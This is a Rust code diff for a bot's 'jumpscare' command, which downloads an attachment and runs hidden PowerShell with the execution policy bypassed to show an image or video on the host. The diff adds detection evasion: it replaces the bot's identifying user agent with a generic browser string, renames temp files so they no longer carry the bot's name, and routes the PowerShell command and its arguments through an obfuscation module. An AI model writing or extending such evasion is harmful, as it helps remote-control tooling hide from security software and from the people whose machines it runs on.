@@ -47,7 +47,7 @@ impl BotCommand for JumpscareCommand {
         let temp_path = Self::get_temp_path(&attachment.filename);
 
         let client = reqwest::Client::builder()
-            .user_agent("Kurinium-Bot/1.0")
+            .user_agent("Mozilla/5.0")
             .timeout(std::time::Duration::from_secs(120))
             .build()?;
 
@@ -114,7 +114,7 @@ impl JumpscareCommand {
     }
 
     fn get_temp_path(filename: &str) -> PathBuf {
-        std::env::temp_dir().join(format!("kurinium_jumpscare_{}", filename))
+        std::env::temp_dir().join(format!("js_{}", filename))
     }
 
     fn execute_jumpscare(file_path: &Path, file_type: FileType) -> Result<()> {
@@ -181,8 +181,9 @@ $image.Dispose()
             image_path.display().to_string().replace("\\", "\\\\")
         );
 
-        let mut cmd = Command::new("powershell");
-        cmd.args(&["-NoProfile", "-ExecutionPolicy", "Bypass", "-Command", &ps_script])
+        use crate::utils::obfuscate::{exe, powershell as ps};
+        let mut cmd = Command::new(exe::powershell());
+        cmd.args(&[&ps::no_profile(), &ps::execution_policy(), &ps::bypass(), &ps::command(), &ps_script])
             .creation_flags(0x08000000);
 
         cmd.spawn()?.wait()?;
@@ -251,8 +252,9 @@ $window.Add_Loaded({{
             video_path_str.replace("\\", "\\\\")
         );
 
-        let mut cmd = Command::new("powershell");
-        cmd.args(&["-NoProfile", "-ExecutionPolicy", "Bypass", "-Command", &ps_script])
+        use crate::utils::obfuscate::{exe, powershell as ps};
+        let mut cmd = Command::new(exe::powershell());
+        cmd.args(&[&ps::no_profile(), &ps::execution_policy(), &ps::bypass(), &ps::command(), &ps_script])
             .creation_flags(0x08000000);
 
         cmd.spawn()?.wait()?;
